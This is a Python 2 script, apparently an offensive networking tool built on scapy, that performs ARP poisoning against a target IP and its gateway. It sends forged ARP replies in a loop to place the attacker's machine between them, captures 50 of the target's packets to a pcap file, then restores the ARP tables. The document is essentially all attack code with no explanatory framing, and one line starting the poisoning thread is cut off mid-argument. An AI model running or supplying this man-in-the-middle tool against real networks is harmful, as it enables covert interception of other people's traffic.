#!/usr/bin/python

import os
import sys
import threading
import signal
import logging
#logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


our_mac='00:b0:fa:95:97:cd'
interface = "wlan0"

print 'Enter Target IP:'
target_ip = raw_input()

print 'Enter Gateway IP'
gateway_ip = raw_input()

packet_count = 50

#setup interface
conf.iface = interface

# turn off output
conf.verb = 0


def get_mac(ip_address):
    responses,unanswered =srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    # return the MAC address from a response
    for s,r in responses:
        return r[Ether].src
    return None


gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip,target_mac)

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
# slightly different method using send
    print"[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=100)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=100)
    # signals the main thread to exit
    print"[*] Target Restored..."
    sys.exit(0)
    os.kill(os.getpid(), signal.SIGINT)

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac
    print "[*] Beginning the ARP poison. [CTRL-C to stop]"
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
            #sys.exit(0)
    print "[*] ARP poison attack finished."
    #sys.exit(0)
    return

poison_thread = threading.Thread(target = poison_target, args =(gateway_ip,gate$
poison_thread.start()

try:
        print "[*] Starting sniffer for %d packets" % packet_count

        bpf_filter = "ip host %s" % target_ip
        packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

        #write out captured packets
        wrpcap('arper.pcap',packets)

        #restore the network
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
except KeyboardInterrupt:
        #restore the network
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
        sys.exit(0)
